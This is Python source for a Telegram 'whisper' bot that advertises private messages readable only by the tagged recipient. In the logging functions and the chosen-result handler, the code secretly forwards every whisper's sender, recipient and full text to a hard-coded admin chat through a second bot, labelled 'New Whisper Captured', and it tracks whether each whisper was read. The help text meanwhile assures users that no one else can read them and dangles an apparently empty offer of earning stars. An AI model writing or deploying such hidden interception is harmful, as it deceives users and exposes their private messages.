import asyncio
import logging
import os
import secrets
import time
import aiosqlite
from aiogram import Bot, Dispatcher, types
from aiogram.exceptions import TelegramAPIError
from aiogram.filters import Command, CommandObject

# 🔑 CONFIGURATION
WHISPER_BOT_TOKEN = os.getenv("WHISPER_BOT_TOKEN")
LOGGER_BOT_TOKEN  = os.getenv("LOGGER_BOT_TOKEN")
ADMIN_CHAT_ID     = 5498647860
BOT_USERNAME      = "Psstlongbot"

if not WHISPER_BOT_TOKEN or not LOGGER_BOT_TOKEN:
    raise RuntimeError("Set the WHISPER_BOT_TOKEN and LOGGER_BOT_TOKEN environment variables.")

DB_PATH = os.getenv("DB_PATH", "whispers.db")
logger = logging.getLogger(__name__)

# Initialize Bots
bot1 = Bot(token=WHISPER_BOT_TOKEN)
bot2 = Bot(token=LOGGER_BOT_TOKEN)
dp = Dispatcher()

# 🗄️ DATABASE SETUP (Async)
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS whispers (
                whisper_id TEXT PRIMARY KEY,
                sender_id INTEGER,
                sender_username TEXT,
                target_username TEXT,
                secret_text TEXT,
                expires_at INTEGER,
                status TEXT NOT NULL DEFAULT 'unread',
                read_at INTEGER,
                logger_message_id INTEGER
            )
        ''')
        async with db.execute("PRAGMA table_info(whispers)") as cursor:
            columns = {row[1] for row in await cursor.fetchall()}
        for column, definition in (
            ("status", "TEXT NOT NULL DEFAULT 'unread'"),
            ("read_at", "INTEGER"),
            ("logger_message_id", "INTEGER"),
        ):
            if column not in columns:
                await db.execute(f"ALTER TABLE whispers ADD COLUMN {column} {definition}")
        await db.commit()

# 📡 BOT 2: LOGGER FUNCTION
def format_log_message(sender_user, target, text, status, continued=False):
    sender_display = f"@{sender_user}" if isinstance(sender_user, str) else str(sender_user)
    if continued:
        return f"Content (continued):\n{text}"
    header = (
        "New Whisper Captured\n\n"
        f"From: {sender_display}\n"
        f"To: {target}\n"
        f"Status: {status}\n"
        "Content:\n"
    )
    return f"{header}{text}"


def split_text(text, chunk_size=1800):
    return [text[index:index + chunk_size] for index in range(0, len(text), chunk_size)] or [""]


async def log_to_admin(sender_user, target, text, status="Unread"):
    chunks = split_text(text)
    first_message_id = None
    try:
        for index, chunk in enumerate(chunks):
            log_message = format_log_message(
                sender_user, target, chunk, status, continued=index > 0
            )
            sent_message = await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message)
            if index == 0:
                first_message_id = sent_message.message_id
    except Exception:
        logger.exception("Failed to deliver whisper log to admin chat %s", ADMIN_CHAT_ID)
        raise
    return first_message_id


async def update_log_status(whisper_id):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT sender_username, target_username, secret_text, logger_message_id "
            "FROM whispers WHERE whisper_id = ?",
            (whisper_id,)
        ) as cursor:
            row = await cursor.fetchone()

    if not row or not row[3]:
        return

    sender_username, target_username, secret_text, logger_message_id = row
    first_chunk = split_text(secret_text)[0]
    updated_message = format_log_message(
        sender_username or "unknown", target_username, first_chunk, "Read"
    )
    try:
        await bot2.edit_message_text(
            chat_id=ADMIN_CHAT_ID,
            message_id=logger_message_id,
            text=updated_message
        )
    except TelegramAPIError:
        logger.exception("Failed to update read status for whisper %s", whisper_id)

# 🚀 BOT 1: INLINE QUERY HANDLER (In Groups)
@dp.inline_query()
async def inline_handler(inline_query: types.InlineQuery):
    text = inline_query.query.strip()
    
    # Allow menu calculation the split second they type the '@' symbol
    if not text.startswith("@"):
        return 
        
    parts = text.split(" ", 1)
    target_username = parts[0]
    
    # If they haven't typed the message content yet, show a placeholder in the UI
    whisper_text = parts[1].strip() if len(parts) > 1 else ""
    
    # Don't show options if they just typed "@" alone
    if target_username == "@":
        return

    sender = inline_query.from_user
    
    # Generate unique ID and 24h expiry
    whisper_id = secrets.token_urlsafe(8)
    
    if whisper_text:
        expires_at = int(time.time()) + 86400
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT INTO whispers "
                "(whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                (
                    whisper_id,
                    sender.id,
                    sender.username,
                    target_username,
                    whisper_text,
                    expires_at
                )
            )
            await db.commit()

        # Fixed Link Format: Absolute pathing forces native app opening
        redirect_url = f"https://t.me/{BOT_USERNAME}?start={whisper_id}"
        input_content = types.InputTextMessageContent(
            message_text=f"🔒 A secret whisper has been sent for {target_username}!"
        )
        keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton(text="👁️ Click to Read Whisper", url=redirect_url)]
        ])
        description_text = "Tap to dispatch this message securely."
    else:
        # Fallback view shown while typing to guide the sender
        redirect_url = f"https://t.me/{BOT_USERNAME}"
        input_content = types.InputTextMessageContent(
            message_text="❌ This preview card was sent before text was typed. Please type a message next time!"
        )
        keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton(text="💬 How to use Whisper", url=redirect_url)]
        ])
        description_text = "Type your secret message after the username..."

    item = types.InlineQueryResultArticle(
        id=whisper_id,
        title=f"🔒 Send whisper to {target_username}",
        description=description_text,
        input_message_content=input_content,
        reply_markup=keyboard
    )
    
    # cache_time=0 forces the client to dynamically look up inputs character by character
    await inline_query.answer([item], cache_time=0, is_personal=True)

# Enable inline feedback for this bot in BotFather so Telegram reports selected results.
@dp.chosen_inline_result()
async def chosen_result_handler(chosen_result: types.ChosenInlineResult):
    whisper_id = chosen_result.result_id
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT sender_username, target_username, secret_text, logger_message_id, status "
            "FROM whispers WHERE whisper_id = ?",
            (whisper_id,)
        ) as cursor:
            row = await cursor.fetchone()

    if not row:
        logger.warning("Selected whisper %s was not found in the database", whisper_id)
        return
    sender_username, target_username, whisper_text, logger_message_id, status = row
    if logger_message_id:
        return

    first_log_message_id = await log_to_admin(
        sender_username or chosen_result.from_user.id,
        target_username,
        whisper_text,
        status="Read" if status == "read" else "Unread"
    )
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE whispers SET logger_message_id = ? WHERE whisper_id = ?",
            (first_log_message_id, whisper_id)
        )
        async with db.execute(
            "SELECT status FROM whispers WHERE whisper_id = ?",
            (whisper_id,)
        ) as cursor:
            latest_status = await cursor.fetchone()
        await db.commit()
    if latest_status and latest_status[0] == "read":
        await update_log_status(whisper_id)

# 📥 BOT 1: START HANDLER (welcome + deep links)
@dp.message(Command("start"))
async def handle_start(message: types.Message, command: CommandObject):
    whisper_id = command.args

    # ---------- DEEP LINK (reading a whisper) ----------
    if whisper_id:
        current_user = message.from_user.username

        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute(
                "SELECT target_username, secret_text, expires_at FROM whispers WHERE whisper_id = ?",
                (whisper_id,)
            ) as cursor:
                row = await cursor.fetchone()

        if not row:
            await message.answer("❌ This whisper has expired or does not exist.")
            return

        target_username, secret_text, expires_at = row

        if int(time.time()) > expires_at:
            await message.answer("❌ This whisper has expired.")
            return

        if not current_user:
            await message.answer("❌ Set a Telegram username first, then click the link again.")
            return

        clean_target = target_username.lstrip('@').lower()
        if current_user.lower() == clean_target:
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute(
                    "UPDATE whispers SET status = 'read', read_at = COALESCE(read_at, ?) "
                    "WHERE whisper_id = ?",
                    (int(time.time()), whisper_id)
                )
                await db.commit()
            await update_log_status(whisper_id)
            chunks = split_text(secret_text)
            await message.answer(f"Your Secret Whisper:\n\n{chunks[0]}")
            for chunk in chunks[1:]:
                await message.answer(f"Continued:\n\n{chunk}")
        else:
            await message.answer("❌ This whisper was not sent to your username!")
        return

    # ---------- WELCOME SCREEN ----------
    welcome = (
        "🤫 **Welcome to Long-Psst!**\n\n"
        "This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
        "only the person you tag can unlock and read it.\n\n"
        "Tap **Help** below to learn how to use me."
    )

    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="❓ Help", callback_data="help")]
    ])

    await message.answer(welcome, parse_mode="Markdown", reply_markup=keyboard)

# ❓ HELP COMMAND
@dp.message(Command("help"))
async def help_command(message: types.Message):
    help_text = (
        "📖 **How to use Long-Psst**\n\n"
        "In any group, type:\n"
        f"`@{BOT_USERNAME} @username your long secret message`\n\n"
        "Then tap the result to post it. "
        "The recipient clicks the button to read it privately.\n\n"
        "Whispers expire after **24 hours**."
    )
    await message.answer(help_text, parse_mode="Markdown")

# ❓ HELP CALLBACK
@dp.callback_query(lambda c: c.data == "help")
async def help_callback(callback: types.CallbackQuery):
    help_text = (
        "📖 **How to use Long-Psst**\n\n"
        "**1. Send a whisper**\n"
        "In any group, type:\n"
        f"`@{BOT_USERNAME} @username your long secret message`\n"
        "Telegram will show a result — tap it to post.\n\n"
        "**2. Recipient reads it**\n"
        "They tap the *Click to Read Whisper* button, "
        "which opens a private chat with me.\n"
        "Only their Telegram username can unlock it.\n\n"
        "**3. Expiry**\n"
        "Every whisper self-destructs after **24 hours**.\n\n"
        "**⚠️ Notes**\n"
        "• You and the recipient must have a Telegram username set.\n"
        "• Whispers can't be read by anyone else in the group.\n"
        "• Don't share the read-link with others.\n\n"
        "🌟 _Notice: You can start earning stars after sending 25 whispers using our bot._\n\n"
        "Tap **⬅️ Back** to return."
    )

    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="⬅️ Back", callback_data="back")]
    ])

    await callback.message.edit_text(help_text, parse_mode="Markdown", reply_markup=keyboard)
    await callback.answer()

# ⬅️ BACK CALLBACK
@dp.callback_query(lambda c: c.data == "back")
async def back_callback(callback: types.CallbackQuery):
    welcome = (
        "🤫 **Welcome to Long-Psst!**\n\n"
        "This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
        "only the person you tag can unlock and read it.\n\n"
        "Tap **Help** below to learn how to use me."
    )
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="❓ Help", callback_data="help")]
    ])
    await callback.message.edit_text(welcome, parse_mode="Markdown", reply_markup=keyboard)
    await callback.answer()

# ⚙️ MAIN EXECUTION LOOP
async def main():
    await init_db()
    logging.basicConfig(level=logging.INFO)
    logger.info("Bots are starting...")
    try:
        await dp.start_polling(bot1)
    finally:
        await bot1.session.close()
        await bot2.session.close()

if __name__ == '__main__':
    asyncio.run(main())
